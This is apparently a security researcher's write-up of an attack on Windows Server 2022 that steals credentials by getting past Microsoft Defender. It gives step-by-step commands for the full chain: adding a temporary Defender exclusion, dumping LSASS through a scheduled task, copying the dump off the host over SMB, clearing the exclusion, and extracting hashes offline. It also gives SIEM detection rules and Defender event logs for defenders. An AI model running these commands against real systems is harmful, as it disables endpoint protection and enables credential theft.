<img width="1868" height="906" alt="transientruletoo" src="https://github.com/user-attachments/assets/98114daf-7b49-4925-9ecc-3bf0e7ac78ca" />


## Overview

This writeup documents a post-compromise credential harvesting chain that survives Defender's artifact-based LSASS dump detection by exploiting a legitimate Windows Defender API to create a timed exclusion window. The chain was validated against Windows Server 2022 across multiple Defender signature versions in April 2026.

This is a follow-on to the Vector 4/5 LSASS dump chain. The Defender signature `Trojan:Win32/LsassDump.A` was confirmed to detect the dump artifact on disk independently of filename or extension (content-based detection). This vector documents how the chain survives that detection, where the detection boundary lies, and how that boundary evolved across three consecutive signature builds.

---

## Environment

| Host | Role | IP | OS | Signatures |
|------|------|----|----|------------|
| WIN-1KS84GNPAUM | Victim (Server 2022) | .198 | Build 20348.587 | 1449230 (working chain) |
| WIN-ATTACK | Victim (Server 2022) | .84 | Build 20348.587 | 1449228 (pre-research), 1449240 (post-update) |
| Kali | Attacker | .218 | — | — |
| ELK | SIEM | .250 | — | — |

---

## Signature Boundary — Critical Finding

Controlled testing across two Server 2022 hosts at identical OS build (20348.587) identified three distinct behavioral states across three consecutive Defender signature builds.

| Signature | Machine | Behavior | Detection Events |
|-----------|---------|----------|-----------------|
| 1449228 | WIN-ATTACK | Artifact caught on disk | EID 1116/1117 — Trojan:Win32/LsassDump.A |
| 1449230 | WIN-1KS84GNPAUM | Exclusion window bypasses detection | EID 1116/1117 suppressed during window; LsassDump.A → LsassDump.B transition observed intra-day |
| 1449240 | WIN-ATTACK | 0kb output — chain fails | Zero detection events — no EID 1116/1117 |

**At signature 1449228:** `Trojan:Win32/LsassDump.A` catches the artifact on disk via Real-Time Protection. Standard artifact-based detection. Exclusion window technique not yet applied.

**At signature 1449230:** The exclusion window works. The dump lands in the excluded path, exfil completes, NT hash extracted. `Trojan:Win32/LsassDump.A` never fires during the window. Additionally, within the same day of testing at this signature version, the detection name changed from `Trojan:Win32/LsassDump.A` (ThreatID 2147816345) to `Trojan:Win32/LsassDump.B` (ThreatID 2147893513) — same artifact content, same Real-Time Protection source, different threat identifier. Microsoft was actively iterating on this detection during the same period this research was conducted and published.

**At signature 1449240:** The exclusion window is irrelevant. The dump produces 0kb output with zero EID 1116/1117 events. Disabling real-time protection restores the dump primitive — strongly indicating Defender is blocking the operation prior to file creation. Observed behavior is consistent with process-level intervention rather than artifact detection. 

A path exclusion is a filesystem control. It has no jurisdiction over memory access interception.

**This technique has a signature expiry date. Observed boundary: between signature builds 1449230 and 1449240 — a delta of 10 signature builds.**

### Intra-day Signature Evolution — LsassDump.A to LsassDump.B

Event log analysis of WIN-1KS84GNPAUM confirmed the following transition at sig 1449230:

| Time | Threat Name | Threat ID | Path |
|------|-------------|-----------|------|
| 4/21/2026 11:45 AM | Trojan:Win32/LsassDump.A | 2147816345 | C:\Windows\Temp\update.log |
| 4/21/2026 12:26 PM | Trojan:Win32/LsassDump.A | 2147816345 | C:\Windows\Temp\update.log |
| 4/21/2026 1:56 PM | Trojan:Win32/LsassDump.B | 2147893513 | C:\Windows\Temp\yabadabadoo1.log |
| 4/22/2026 3:40 AM | Trojan:Win32/LsassDump.B | 2147893513 | C:\Windows\Temp\dmp220426.log |

Same artifact content, same detection source (Real-Time Protection), same signature build — different threat name and ID. Whether `.B` represents a pattern refinement or reclassification is not determinable from event log data alone.

WIN-ATTACK event logs confirmed zero 1116/1117 events at sig 1449240 — consistent with the dump being blocked prior to file creation rather than detected post-write.

---

## Detection Boundary Analysis

### What Defender catches (sig 1449228 / 1449230)

`Trojan:Win32/LsassDump.A` / `.B` detects the LSASS minidump artifact on disk. Detection is:
- **Content-based**, not path or filename based
- **Independent** of extension (`.dmp`, `.log`, `.txt` — all caught)
- **Active at SMB access** — `NT_STATUS_VIRUS_INFECTED` blocks remote retrieval of quarantined artifacts

### What Defender catches (sig 1449240)

- Observed behavior suggests interception of the dump primitive at the process level — consistent with blocking prior to filesystem write
- Exclusion path has no effect — 0kb output, artifact never created
- No alert, no quarantine, no EID 1116/1117 — silent block

### What Defender does not catch (any version tested)

- The dump binary (custom P/Invoke implementation)
- The TLS reverse shell
- Any execution prior to the dump primitive call

---

## Attack Chain

### Prerequisites

- SYSTEM-level shell on victim (established via TLS reverse shell — see Vector 4/5)
- `getit2.exe` staged to `C:\Windows\Tasks\` via SMB
- Attacker has valid credentials for SMB access
- Target running Defender signatures at or below build 1449230

### Execution Sequence

**1. Establish SYSTEM shell**

Via goexec scheduled task execution delivering TLS reverse shell (getit2.exe) to ncat listener on attacker:

```
goexec_v0.3.0_linux_amd64 //[VICTIM] \
  -u administrator \
  -p '[PASSWORD]' \
  --task '\\systemshell' \
  --exec 'C:\Windows\Tasks\getit2.exe' \
  --args ''
```

**2. Add Defender exclusion (SYSTEM shell)**

```powershell
Add-MpPreference -ExclusionPath "C:\Windows\Temp"
```

EID 5007 fires immediately.

**3. Dump LSASS into excluded path**

Via goexec scheduled task:

```
goexec_v0.3.0_linux_amd64 //[VICTIM] \
  -u administrator \
  -p '[PASSWORD]' \
  --task '\\lsassdump' \
  --exec 'C:\Windows\Tasks\getit2.exe' \
  --args '--dump C:\Windows\Temp\[FILENAME].log'
```

**4. Exfiltrate artifact (while exclusion still active)**

```bash
smbclient //[VICTIM]/C$ \
  -U '[USER]%[PASSWORD]' \
  -c "get Windows\Temp\[FILENAME].log /tmp/[FILENAME].dmp"
```

**Critical:** Exfiltration must occur before the exclusion is removed. If the exclusion is removed first, Defender rescans and blocks SMB with `NT_STATUS_VIRUS_INFECTED`.

**5. Remove exclusion (cleanup)**

```powershell
Remove-MpPreference -ExclusionPath "C:\Windows\Temp"
```

EID 5007 fires. No dump artifact remains on disk on the victim.

**6. Extract credentials offline**

```bash
pypykatz lsa minidump [FILENAME].dmp
```

### Operational Window

Total time between exclusion add and remove: under 60 seconds in observed runs. Detection never fired during any successful run.

---

## Detection

### EID 5007 — Defender Configuration Change

**Rule 1: Exclusion Path Added**

```kql
event.code: "5007" 
and event.provider: "Microsoft-Windows-Windows Defender" 
and winlog.event_data.New Value: *Exclusions*
```

Severity: **High** | MITRE: T1562.001

---

**Rule 2: Exclusion Path Removed**

```kql
event.code: "5007" 
and event.provider: "Microsoft-Windows-Windows Defender" 
and winlog.event_data.Old Value: *Exclusions*
```

Severity: **High** | MITRE: T1562.001

---

**Rule 3: Transient Exclusion Window (EQL — Event Correlation rule type)**

```eql
sequence by winlog.computer_name with maxspan=5m
  [any where event.code == "5007" and winlog.event_data.`New Value` like "*Exclusions*"]
  [any where event.code == "5007" and winlog.event_data.`Old Value` like "*Exclusions*"]
```

Severity: **Critical (99)** | MITRE: T1562.001

No common administrative workflow performs this sequence within a short window on the same host.

---

### EID 10 — LSASS Process Access (Sysmon)

```kql
event.code: "10" 
and winlog.event_data.TargetImage: "C:\\Windows\\system32\\lsass.exe" 
and winlog.event_data.SourceImage: *Tasks*
```

Severity: **Critical (99)** | MITRE: T1003.001

**Key telemetry indicators:**
- `GrantedAccess: 0x1FFFFF` — PROCESS_ALL_ACCESS, consistent with MiniDumpWriteDump
- `GrantedAccess: 0x1F3FFF` — handle duplication access, observed in same dump sequence
- `UNKNOWN(...)` entries in CallTrace — reflectively loaded or position-independent code
- SourceImage in `C:\Windows\Tasks\` — no legitimate process accesses lsass with full access from this path

**Critical note:** EID 10 fires on the memory access itself regardless of whether the artifact survives. At sig 1449240, EID 10 still fires even though the dump fails — the access attempt is logged regardless of Defender's response.

---

## Detection Gap

The exclusion window technique defeats artifact-based detection at sig 1449230 completely. At sig 1449240 the technique fails at the primitive level — but blue teams should not rely on this as a control. Signature versions are not a static defense boundary. A lower-signature estate, an air-gapped environment, or a delayed-update scenario restores attacker capability immediately.

**Minimum viable detection stack:**
- Winlogbeat collecting `Microsoft-Windows-Windows Defender/Operational` (EID 5007)
- Sysmon deployed with ProcessAccess monitoring targeting lsass.exe
- Correlation rule for the exclusion add→remove sequence

---

## Verification Steps

**1. Confirm signature version**
```powershell
Get-MpComputerStatus | Select-Object AntivirusSignatureVersion, AntivirusSignatureLastUpdated
```

**2. Run dump primitive with RTP enabled — observe file size**
```powershell
(Get-Item "C:\Windows\Temp\[FILENAME].log").Length
```
Expected at sig 1449230: ~45MB. Expected at sig 1449240: 0 bytes.

**3. Run dump primitive with RTP disabled — observe file size**
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```
If artifact is non-zero with RTP off and zero with RTP on, behavior is consistent with Defender intervention prior to filesystem write.

**4. Correlate with EID 10**

Confirm Sysmon EID 10 fires in both RTP-on and RTP-off conditions. The memory access attempt is logged regardless of outcome.

---

## Notes

- The dump binary (getit2.exe) remained undetected across all test runs
- The TLS reverse shell remained undetected across all test runs
- Observed behavior suggests a shift in Defender's detection boundary between sig 1449230 and 1449240 — consistent with intervention at the process level prior to filesystem write
- The shift is silent — no EID 1116/1117, no quarantine, no notification
- EID 10 remains the most reliable detection regardless of artifact survival or signature version
- Do not rely on signature version as a defense boundary — it is not a static control
- Binary-level analysis of the behavioral delta between these builds is left to researchers with access to the relevant components

---
<img width="1868" height="906" alt="transientruletoo" src="https://github.com/user-attachments/assets/07ed77aa-bd67-43a4-bf2a-97028e2d6ef3" />


Failure on win-attack with RTP on:


<img width="1851" height="901" alt="win-attackredacted" src="https://github.com/user-attachments/assets/4b2e3f04-fe8d-40fa-a999-38930a3c3a63" />


Success on win-attack with RTP off:


<img width="1860" height="860" alt="working84withRTPswitchedoffredacted" src="https://github.com/user-attachments/assets/5c8f5a99-eece-4d5f-abfe-3ea0d3b3f943" />


Extraction of lsass post success on win-attack with RTP off


<img width="1848" height="853" alt="extractionoflsasswithRTPoffPoCredacted" src="https://github.com/user-attachments/assets/e76a62b1-4626-4e0d-9400-551568e8b633" />


Attack on win-attack failure with RTP on:


<img width="1851" height="901" alt="win-attackredacted" src="https://github.com/user-attachments/assets/0aa6a80f-289e-47f9-a820-39925bdd2e3a" />


Failed write of lsass ("84dump"). Note file is 0KB


<img width="1802" height="862" alt="dumpfailon84a" src="https://github.com/user-attachments/assets/27cebfbf-3fb2-4654-83e8-0f619fd1fa81" />

<img width="1137" height="635" alt="winattackUBRandDEFENDERDEFS" src="https://github.com/user-attachments/assets/98714c45-d0a5-484c-a02a-4d8fd89c6c63" />


Success on WIN-1KS84GNPAUM (192.168.1.198)


<img width="1843" height="905" alt="working198redacted" src="https://github.com/user-attachments/assets/85a87999-b5e1-4798-ada4-c5a0425eddd1" />

<img width="1348" height="695" alt="otherUBR+DEFENDERDFS22042026" src="https://github.com/user-attachments/assets/b48d9921-4eed-44ac-b963-ed3b1cdcec8e" />








## Defender logs on Win-Attack (192.168.1.84)

TimeCreated : 4/21/2026 9:54:12 AM
Id          : 1117
Message     : Microsoft Defender Antivirus has taken action to protect this machine from malware or other potentially unwanted software.
               For more information please see the following:
              https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/LsassDump.A&threatid=2147816345&enterprise=0
               	Name: Trojan:Win32/LsassDump.A
               	ID: 2147816345
               	Severity: Severe
               	Category: Trojan
               	Path: file:_C:\Windows\Temp\update.log
               	Detection Origin: Local machine
               	Detection Type: Concrete
               	Detection Source: Real-Time Protection
               	User: NT AUTHORITY\SYSTEM
               	Process Name: Unknown
               	Action: Quarantine
               	Action Status:  No additional actions required
               	Error Code: 0x00000000
               	Error description: The operation completed successfully. 
               	Security intelligence Version: AV: 1.449.228.0, AS: 1.449.228.0, NIS: 1.449.228.0
               	Engine Version: AM: 1.1.26030.3008, NIS: 1.1.26030.3008

TimeCreated : 4/21/2026 9:54:03 AM
Id          : 1116
Message     : Microsoft Defender Antivirus has detected malware or other potentially unwanted software.
               For more information please see the following:
              https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/LsassDump.A&threatid=2147816345&enterprise=0
               	Name: Trojan:Win32/LsassDump.A
               	ID: 2147816345
               	Severity: Severe
               	Category: Trojan
               	Path: file:_C:\Windows\Temp\update.log
               	Detection Origin: Local machine
               	Detection Type: Concrete
               	Detection Source: Real-Time Protection
               	User: 
               	Process Name: Unknown
               	Security intelligence Version: AV: 1.449.228.0, AS: 1.449.228.0, NIS: 1.449.228.0
               	Engine Version: AM: 1.1.26030.3008, NIS: 1.1.26030.3008

TimeCreated : 4/21/2026 8:29:27 AM
Id          : 1117
Message     : Microsoft Defender Antivirus has taken action to protect this machine from malware or other potentially unwanted software.
               For more information please see the following:
              https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/LsassDump.A&threatid=2147816345&enterprise=0
               	Name: Trojan:Win32/LsassDump.A
               	ID: 2147816345
               	Severity: Severe
               	Category: Trojan
               	Path: file:_C:\Windows\Temp\update.log
               	Detection Origin: Local machine
               	Detection Type: Concrete
               	Detection Source: Real-Time Protection
               	User: NT AUTHORITY\SYSTEM
               	Process Name: Unknown
               	Action: Quarantine
               	Action Status:  No additional actions required
               	Error Code: 0x00000000
               	Error description: The operation completed successfully. 
               	Security intelligence Version: AV: 1.449.228.0, AS: 1.449.228.0, NIS: 1.449.228.0
               	Engine Version: AM: 1.1.26030.3008, NIS: 1.1.26030.3008

TimeCreated : 4/21/2026 8:29:18 AM
Id          : 1116
Message     : Microsoft Defender Antivirus has detected malware or other potentially unwanted software.
               For more information please see the following:
              https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/LsassDump.A&threatid=2147816345&enterprise=0
               	Name: Trojan:Win32/LsassDump.A
               	ID: 2147816345
               	Severity: Severe
               	Category: Trojan
               	Path: file:_C:\Windows\Temp\update.log
               	Detection Origin: Local machine
               	Detection Type: Concrete
               	Detection Source: Real-Time Protection
               	User: 
               	Process Name: Unknown
               	Security intelligence Version: AV: 1.449.228.0, AS: 1.449.228.0, NIS: 1.449.228.0
               	Engine Version: AM: 1.1.26030.3008, NIS: 1.1.26030.3008

TimeCreated : 4/21/2026 7:42:42 AM
Id          : 1117
Message     : Microsoft Defender Antivirus has taken action to protect this machine from malware or other potentially unwanted software.
               For more information please see the following:
              https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/LsassDump.A&threatid=2147816345&enterprise=0
               	Name: Trojan:Win32/LsassDump.A
               	ID: 2147816345
               	Severity: Severe
               	Category: Trojan
               	Path: file:_C:\Windows\Temp\update.log
               	Detection Origin: Local machine
               	Detection Type: Concrete
               	Detection Source: Real-Time Protection
               	User: NT AUTHORITY\SYSTEM
               	Process Name: Unknown
               	Action: Quarantine
               	Action Status:  No additional actions required
               	Error Code: 0x00000000
               	Error description: The operation completed successfully. 
               	Security intelligence Version: AV: 1.449.228.0, AS: 1.449.228.0, NIS: 1.449.228.0
               	Engine Version: AM: 1.1.26030.3008, NIS: 1.1.26030.3008

TimeCreated : 4/21/2026 7:42:32 AM
Id          : 1116
Message     : Microsoft Defender Antivirus has detected malware or other potentially unwanted software.
               For more information please see the following:
              https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/LsassDump.A&threatid=2147816345&enterprise=0
               	Name: Trojan:Win32/LsassDump.A
               	ID: 2147816345
               	Severity: Severe
               	Category: Trojan
               	Path: file:_C:\Windows\Temp\update.log
               	Detection Origin: Local machine
               	Detection Type: Concrete
               	Detection Source: Real-Time Protection
               	User: 
               	Process Name: Unknown
               	Security intelligence Version: AV: 1.449.228.0, AS: 1.449.228.0, NIS: 1.449.228.0
               	Engine Version: AM: 1.1.26030.3008, NIS: 1.1.26030.3008

TimeCreated : 4/21/2026 7:40:50 AM
Id          : 1117
Message     : Microsoft Defender Antivirus has taken action to protect this machine from malware or other potentially unwanted software.
               For more information please see the following:
              https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/LsassDump.A&threatid=2147816345&enterprise=0
               	Name: Trojan:Win32/LsassDump.A
               	ID: 2147816345
               	Severity: Severe
               	Category: Trojan
               	Path: file:_C:\Windows\Temp\update.log
               	Detection Origin: Local machine
               	Detection Type: Concrete
               	Detection Source: Real-Time Protection
               	User: NT AUTHORITY\SYSTEM
               	Process Name: Unknown
               	Action: Quarantine
               	Action Status:  No additional actions required
               	Error Code: 0x00000000
               	Error description: The operation completed successfully. 
               	Security intelligence Version: AV: 1.449.228.0, AS: 1.449.228.0, NIS: 1.449.228.0
               	Engine Version: AM: 1.1.26030.3008, NIS: 1.1.26030.3008

TimeCreated : 4/21/2026 7:40:40 AM
Id          : 1116
Message     : Microsoft Defender Antivirus has detected malware or other potentially unwanted software.
               For more information please see the following:
              https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/LsassDump.A&threatid=2147816345&enterprise=0
               	Name: Trojan:Win32/LsassDump.A
               	ID: 2147816345
               	Severity: Severe
               	Category: Trojan
               	Path: file:_C:\Windows\Temp\update.log
               	Detection Origin: Local machine
               	Detection Type: Concrete
               	Detection Source: Real-Time Protection
               	User: 
               	Process Name: Unknown
               	Security intelligence Version: AV: 1.449.228.0, AS: 1.449.228.0, NIS: 1.449.228.0
               	Engine Version: AM: 1.1.26030.3008, NIS: 1.1.26030.3008

TimeCreated : 4/21/2026 7:40:23 AM
Id          : 1117
Message     : Microsoft Defender Antivirus has taken action to protect this machine from malware or other potentially unwanted software.
               For more information please see the following:
              https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/LsassDump.A&threatid=2147816345&enterprise=0
               	Name: Trojan:Win32/LsassDump.A
               	ID: 2147816345
               	Severity: Severe
               	Category: Trojan
               	Path: file:_C:\Windows\Temp\update.log
               	Detection Origin: Local machine
               	Detection Type: Concrete
               	Detection Source: Real-Time Protection
               	User: NT AUTHORITY\SYSTEM
               	Process Name: Unknown
               	Action: Quarantine
               	Action Status:  No additional actions required
               	Error Code: 0x00000000
               	Error description: The operation completed successfully. 
               	Security intelligence Version: AV: 1.449.228.0, AS: 1.449.228.0, NIS: 1.449.228.0
               	Engine Version: AM: 1.1.26030.3008, NIS: 1.1.26030.3008

TimeCreated : 4/21/2026 7:40:13 AM
Id          : 1116
Message     : Microsoft Defender Antivirus has detected malware or other potentially unwanted software.
               For more information please see the following:
              https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/LsassDump.A&threatid=2147816345&enterprise=0
               	Name: Trojan:Win32/LsassDump.A
               	ID: 2147816345
               	Severity: Severe
               	Category: Trojan
               	Path: file:_C:\Windows\Temp\update.log
               	Detection Origin: Local machine
               	Detection Type: Concrete
               	Detection Source: Real-Time Protection
               	User: 
               	Process Name: Unknown
               	Security intelligence Version: AV: 1.449.228.0, AS: 1.449.228.0, NIS: 1.449.228.0
               	Engine Version: AM: 1.1.26030.3008, NIS: 1.1.26030.3008

TimeCreated : 4/21/2026 7:24:59 AM
Id          : 1117
Message     : Microsoft Defender Antivirus has taken action to protect this machine from malware or other potentially unwanted software.
               For more information please see the following:
              https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/LsassDump.A&threatid=2147816345&enterprise=0
               	Name: Trojan:Win32/LsassDump.A
               	ID: 2147816345
               	Severity: Severe
               	Category: Trojan
               	Path: file:_C:\Windows\Temp\lsass.dmp
               	Detection Origin: Local machine
               	Detection Type: Concrete
               	Detection Source: Real-Time Protection
               	User: NT AUTHORITY\SYSTEM
               	Process Name: Unknown
               	Action: Quarantine
               	Action Status:  No additional actions required
               	Error Code: 0x00000000
               	Error description: The operation completed successfully. 
               	Security intelligence Version: AV: 1.449.228.0, AS: 1.449.228.0, NIS: 1.449.228.0
               	Engine Version: AM: 1.1.26030.3008, NIS: 1.1.26030.3008

TimeCreated : 4/21/2026 7:24:50 AM
Id          : 1116
Message     : Microsoft Defender Antivirus has detected malware or other potentially unwanted software.
               For more information please see the following:
              https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/LsassDump.A&threatid=2147816345&enterprise=0
               	Name: Trojan:Win32/LsassDump.A
               	ID: 2147816345
               	Severity: Severe
               	Category: Trojan
               	Path: file:_C:\Windows\Temp\lsass.dmp
               	Detection Origin: Local machine
               	Detection Type: Concrete
               	Detection Source: Real-Time Protection
               	User: 
               	Process Name: Unknown
               	Security intelligence Version: AV: 1.449.228.0, AS: 1.449.228.0, NIS: 1.449.228.0
               	Engine Version: AM: 1.1.26030.3008, NIS: 1.1.26030.3008

TimeCreated : 4/21/2026 7:23:46 AM
Id          : 1117
Message     : Microsoft Defender Antivirus has taken action to protect this machine from malware or other potentially unwanted software.
               For more information please see the following:
              https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/LsassDump.A&threatid=2147816345&enterprise=0
               	Name: Trojan:Win32/LsassDump.A
               	ID: 2147816345
               	Severity: Severe
               	Category: Trojan
               	Path: file:_C:\Windows\Temp\lsass.dmp
               	Detection Origin: Local machine
               	Detection Type: Concrete
               	Detection Source: Real-Time Protection
               	User: NT AUTHORITY\SYSTEM
               	Process Name: Unknown
               	Action: Quarantine
               	Action Status:  No additional actions required
               	Error Code: 0x00000000
               	Error description: The operation completed successfully. 
               	Security intelligence Version: AV: 1.449.228.0, AS: 1.449.228.0, NIS: 1.449.228.0
               	Engine Version: AM: 1.1.26030.3008, NIS: 1.1.26030.3008

TimeCreated : 4/21/2026 7:23:36 AM
Id          : 1116
Message     : Microsoft Defender Antivirus has detected malware or other potentially unwanted software.
               For more information please see the following:
              https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/LsassDump.A&threatid=2147816345&enterprise=0
               	Name: Trojan:Win32/LsassDump.A
               	ID: 2147816345
               	Severity: Severe
               	Category: Trojan
               	Path: file:_C:\Windows\Temp\lsass.dmp
               	Detection Origin: Local machine
               	Detection Type: Concrete
               	Detection Source: Real-Time Protection
               	User: 
               	Process Name: Unknown
               	Security intelligence Version: AV: 1.449.228.0, AS: 1.449.228.0, NIS: 1.449.228.0
               	Engine Version: AM: 1.1.26030.3008, NIS: 1.1.26030.3008

## Defender logs on WIN-1KS84GNPAUM (192.168.1.198)

TimeCreated : 4/22/2026 7:27:30 AM
Id          : 1116
Message     : Microsoft Defender Antivirus has detected malware or other potentially unwanted software.
               For more information please see the following:
              https://go.microsoft.com/fwlink/?linkid=37020&name=SettingsModifier:Win32/PossibleHostsFileHijack&threatid=14994&enterprise=0
               	Name: SettingsModifier:Win32/PossibleHostsFileHijack
               	ID: 14994
               	Severity: Medium
               	Category: Settings Modifier
               	Path: file:_C:\Windows\System32\drivers\etc\hosts
               	Detection Origin: Local machine
               	Detection Type: Concrete
               	Detection Source: System
               	User: NT AUTHORITY\SYSTEM
               	Process Name: Unknown
               	Security intelligence Version: AV: 1.449.230.0, AS: 1.449.230.0, NIS: 1.449.230.0
               	Engine Version: AM: 1.1.26030.3008, NIS: 1.1.26030.3008

TimeCreated : 4/22/2026 7:27:13 AM
Id          : 1116
Message     : Microsoft Defender Antivirus has detected malware or other potentially unwanted software.
               For more information please see the following:
              https://go.microsoft.com/fwlink/?linkid=37020&name=SettingsModifier:Win32/PossibleHostsFileHijack&threatid=14994&enterprise=0
               	Name: SettingsModifier:Win32/PossibleHostsFileHijack
               	ID: 14994
               	Severity: Medium
               	Category: Settings Modifier
               	Path: file:_C:\Windows\System32\drivers\etc\hosts
               	Detection Origin: Local machine
               	Detection Type: Concrete
               	Detection Source: System
               	User: NT AUTHORITY\SYSTEM
               	Process Name: Unknown
               	Security intelligence Version: AV: 1.449.230.0, AS: 1.449.230.0, NIS: 1.449.230.0
               	Engine Version: AM: 1.1.26030.3008, NIS: 1.1.26030.3008

TimeCreated : 4/22/2026 3:41:07 AM
Id          : 1117
Message     : Microsoft Defender Antivirus has taken action to protect this machine from malware or other potentially unwanted software.
               For more information please see the following:
              https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/LsassDump.B&threatid=2147893513&enterprise=0
               	Name: Trojan:Win32/LsassDump.B
               	ID: 2147893513
               	Severity: Severe
               	Category: Trojan
               	Path: file:_C:\Windows\Temp\dmp220426.log
               	Detection Origin: Local machine
               	Detection Type: Concrete
               	Detection Source: Real-Time Protection
               	User: NT AUTHORITY\SYSTEM
               	Process Name: System
               	Action: Quarantine
               	Action Status:  No additional actions required
               	Error Code: 0x00000000
               	Error description: The operation completed successfully. 
               	Security intelligence Version: AV: 1.449.230.0, AS: 1.449.230.0, NIS: 1.449.230.0
               	Engine Version: AM: 1.1.26030.3008, NIS: 1.1.26030.3008

TimeCreated : 4/22/2026 3:40:57 AM
Id          : 1116
Message     : Microsoft Defender Antivirus has detected malware or other potentially unwanted software.
               For more information please see the following:
              https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/LsassDump.B&threatid=2147893513&enterprise=0
               	Name: Trojan:Win32/LsassDump.B
               	ID: 2147893513
               	Severity: Severe
               	Category: Trojan
               	Path: file:_C:\Windows\Temp\dmp220426.log
               	Detection Origin: Local machine
               	Detection Type: Concrete
               	Detection Source: Real-Time Protection
               	User: NT Authority\System
               	Process Name: System
               	Security intelligence Version: AV: 1.449.230.0, AS: 1.449.230.0, NIS: 1.449.230.0
               	Engine Version: AM: 1.1.26030.3008, NIS: 1.1.26030.3008

TimeCreated : 4/22/2026 3:35:19 AM
Id          : 1116
Message     : Microsoft Defender Antivirus has detected malware or other potentially unwanted software.
               For more information please see the following:
              https://go.microsoft.com/fwlink/?linkid=37020&name=SettingsModifier:Win32/PossibleHostsFileHijack&threatid=14994&enterprise=0
               	Name: SettingsModifier:Win32/PossibleHostsFileHijack
               	ID: 14994
               	Severity: Medium
               	Category: Settings Modifier
               	Path: file:_C:\Windows\System32\drivers\etc\hosts
               	Detection Origin: Local machine
               	Detection Type: Concrete
               	Detection Source: System
               	User: NT AUTHORITY\SYSTEM
               	Process Name: Unknown
               	Security intelligence Version: AV: 1.449.230.0, AS: 1.449.230.0, NIS: 1.449.230.0
               	Engine Version: AM: 1.1.26030.3008, NIS: 1.1.26030.3008

TimeCreated : 4/21/2026 3:35:10 PM
Id          : 1117
Message     : Microsoft Defender Antivirus has taken action to protect this machine from malware or other potentially unwanted software.
               For more information please see the following:
              https://go.microsoft.com/fwlink/?linkid=37020&name=VirTool:Win32/SuspRemoteCmdCommand.H&threatid=2147851517&enterprise=0
               	Name: VirTool:Win32/SuspRemoteCmdCommand.H
               	ID: 2147851517
               	Severity: Severe
               	Category: Tool
               	Path: CmdLine:_C:\Windows\System32\cmd.exe /Q /c whoami /priv > C:\Windows\Temp\out.txt 1> \Windows\Temp\GXNCHi 2>&1
               	Detection Origin: Unknown
               	Detection Type: Concrete
               	Detection Source: System
               	User: NT AUTHORITY\SYSTEM
               	Process Name: Unknown
               	Action: Remove
               	Action Status:  No additional actions required
               	Error Code: 0x00000000
               	Error description: The operation completed successfully. 
               	Security intelligence Version: AV: 1.449.230.0, AS: 1.449.230.0, NIS: 1.449.230.0
               	Engine Version: AM: 1.1.26030.3008, NIS: 1.1.26030.3008

TimeCreated : 4/21/2026 3:35:02 PM
Id          : 1116
Message     : Microsoft Defender Antivirus has detected malware or other potentially unwanted software.
               For more information please see the following:
              https://go.microsoft.com/fwlink/?linkid=37020&name=VirTool:Win32/SuspRemoteCmdCommand.H&threatid=2147851517&enterprise=0
               	Name: VirTool:Win32/SuspRemoteCmdCommand.H
               	ID: 2147851517
               	Severity: Severe
               	Category: Tool
               	Path: CmdLine:_C:\Windows\System32\cmd.exe /Q /c whoami /priv > C:\Windows\Temp\out.txt 1> \Windows\Temp\GXNCHi 2>&1
               	Detection Origin: Unknown
               	Detection Type: Concrete
               	Detection Source: System
               	User: NT AUTHORITY\SYSTEM
               	Process Name: Unknown
               	Security intelligence Version: AV: 1.449.230.0, AS: 1.449.230.0, NIS: 1.449.230.0
               	Engine Version: AM: 1.1.26030.3008, NIS: 1.1.26030.3008

TimeCreated : 4/21/2026 3:34:07 PM
Id          : 1117
Message     : Microsoft Defender Antivirus has taken action to protect this machine from malware or other potentially unwanted software.
               For more information please see the following:
              https://go.microsoft.com/fwlink/?linkid=37020&name=VirTool:Win32/SuspRemoteCmdCommand.H&threatid=2147851517&enterprise=0
               	Name: VirTool:Win32/SuspRemoteCmdCommand.H
               	ID: 2147851517
               	Severity: Severe
               	Category: Tool
               	Path: CmdLine:_C:\Windows\System32\cmd.exe /Q /c whoami /priv 1> \Windows\Temp\UPDKMa 2>&1
               	Detection Origin: Unknown
               	Detection Type: Concrete
               	Detection Source: System
               	User: NT AUTHORITY\SYSTEM
               	Process Name: Unknown
               	Action: Remove
               	Action Status:  No additional actions required
               	Error Code: 0x00000000
               	Error description: The operation completed successfully. 
               	Security intelligence Version: AV: 1.449.230.0, AS: 1.449.230.0, NIS: 1.449.230.0
               	Engine Version: AM: 1.1.26030.3008, NIS: 1.1.26030.3008

TimeCreated : 4/21/2026 3:33:58 PM
Id          : 1116
Message     : Microsoft Defender Antivirus has detected malware or other potentially unwanted software.
               For more information please see the following:
              https://go.microsoft.com/fwlink/?linkid=37020&name=VirTool:Win32/SuspRemoteCmdCommand.H&threatid=2147851517&enterprise=0
               	Name: VirTool:Win32/SuspRemoteCmdCommand.H
               	ID: 2147851517
               	Severity: Severe
               	Category: Tool
               	Path: CmdLine:_C:\Windows\System32\cmd.exe /Q /c whoami /priv 1> \Windows\Temp\UPDKMa 2>&1
               	Detection Origin: Unknown
               	Detection Type: Concrete
               	Detection Source: System
               	User: NT AUTHORITY\SYSTEM
               	Process Name: Unknown
               	Security intelligence Version: AV: 1.449.230.0, AS: 1.449.230.0, NIS: 1.449.230.0
               	Engine Version: AM: 1.1.26030.3008, NIS: 1.1.26030.3008

TimeCreated : 4/21/2026 1:56:39 PM
Id          : 1117
Message     : Microsoft Defender Antivirus has taken action to protect this machine from malware or other potentially unwanted software.
               For more information please see the following:
              https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/LsassDump.B&threatid=2147893513&enterprise=0
               	Name: Trojan:Win32/LsassDump.B
               	ID: 2147893513
               	Severity: Severe
               	Category: Trojan
